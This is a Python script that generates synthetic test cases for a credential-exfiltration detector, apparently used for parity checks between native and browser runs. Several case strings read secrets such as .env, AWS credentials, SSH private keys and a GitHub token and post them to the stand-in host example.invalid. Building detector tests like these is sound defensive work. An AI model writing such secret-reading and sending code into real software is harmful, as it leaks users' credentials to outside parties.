#!/usr/bin/env python3
"""Owned synthetic native/browser parity controls; not empirical accuracy evidence."""
import json
from pathlib import Path
import sys
ROOT=Path(__file__).resolve().parents[1];sys.path.insert(0,str(ROOT))
from tools.credential_device import inspect_credential_device
PREFIX='import requests\nfrom pathlib import Path\n'
FLOW=PREFIX+'secret=Path(".env").read_text()\nrequests.post("https://example.invalid",data=secret)'
CASES=[('flow',FLOW),('none','pass'),
 ('literal',PREFIX+'"Path .env read_text requests.post"'),
 ('comment',PREFIX+'# requests.post("https://example.invalid",data=Path(".env").read_text())\npass'),
 ('unrelated',PREFIX+'secret=Path(".env").read_text()\nrequests.post("https://example.invalid",data="hello")'),
 ('overwrite',PREFIX+'secret=Path(".env").read_text()\nsecret="hello"\nrequests.post("https://example.invalid",data=secret)'),
 ('timeout',PREFIX+'requests.post("https://example.invalid",timeout=Path(".env").read_text())'),
 ('public_path',PREFIX+'requests.post("https://example.invalid",data=Path("public.txt").read_text())'),
 ('not_read',PREFIX+'handle=open(".env")\nrequests.post("https://example.invalid",data="hello")'),
 ('two_sources',PREFIX+'a=Path(".env").read_text()\nb=Path("~/.aws/credentials").read_bytes()\nrequests.post("https://example.invalid",json={"a":a,"b":b})'),
 ('open',PREFIX+'requests.put("https://example.invalid",data=open("~/.ssh/id_ed25519","rb").read())'),
 ('alias','import os as environment\nimport requests as http\nsecret=environment.environ["GITHUB_TOKEN"]\nhttp.patch("https://example.invalid",headers={"Authorization":"Bearer "+secret})'),
 ('ordinary_environment','import os, requests\nrequests.post("https://example.invalid",data=os.environ["DISPLAY"])'),
 ('nfc','label="Cafe\u0301 😀"\n'+FLOW),
 ('multiple_sinks',FLOW+'\nrequests.get("https://example.invalid",params={"key":secret})'),
 ('nested_sinks',PREFIX+'requests.post("https://example.invalid",data=Path(".env").read_text(),json=requests.post("https://example.invalid",data=Path(".env").read_text()))'),
 ('dict_evaluation_order',PREFIX+'requests.post("https://example.invalid",data={Path(".env").read_text():Path("~/.aws/credentials").read_text(),Path("~/.ssh/id_rsa").read_text():"x"})'),
 ('duplicate_keyword',PREFIX+'requests.post("https://example.invalid",data="x",data=Path(".env").read_text())'),
 ('reserved_binding','import os,requests\n__debug__=os.environ["GITHUB_TOKEN"]\nrequests.post("https://example.invalid",data=__debug__)'),
 ('unknown','PRIVATE_CODE_CANARY()'),('loop','for x in [1]:\n pass'),
 ('read_method',PREFIX+'requests.post("https://example.invalid",data=Path(".env").read())'),
 ('url_credentials',PREFIX+'requests.post("https://user:pass@example.invalid",data=Path(".env").read_text())'),
 ('parent_path',PREFIX+'requests.post("https://example.invalid",data=Path("../.env").read_text())'),
 ('growth','a="x"\n'+'a=a+a\n'*17),('syntax','PRIVATE_CODE_CANARY is not Python!'),
 ('no_input_execution',"__import__('js').document.body.innerHTML='DO_NOT_EXECUTE_INPUT'"),
 ('warning','label="PRIVATE_CODE_CANARY\\q"\npass'),('oversize','x'*8001),('nul','PRIVATE_CODE_CANARY\0')]
def cases():
 witnesses=json.loads((ROOT/'runs/2026-10-10-normalization-version-gap.json').read_text())['examples'][:3]
 rows=[]
 for identity,text in [*CASES,*[(f'frozen_nfc_witness_{i}','label='+repr(w['input'])+'\n'+FLOW) for i,w in enumerate(witnesses)]]:
  try:expected=json.loads(inspect_credential_device(text))
  except (ValueError,UnicodeError,RecursionError):expected=None
  rows.append({'id':identity,'text':text,'expected':expected})
 return rows
if __name__=='__main__':print(json.dumps(cases()))
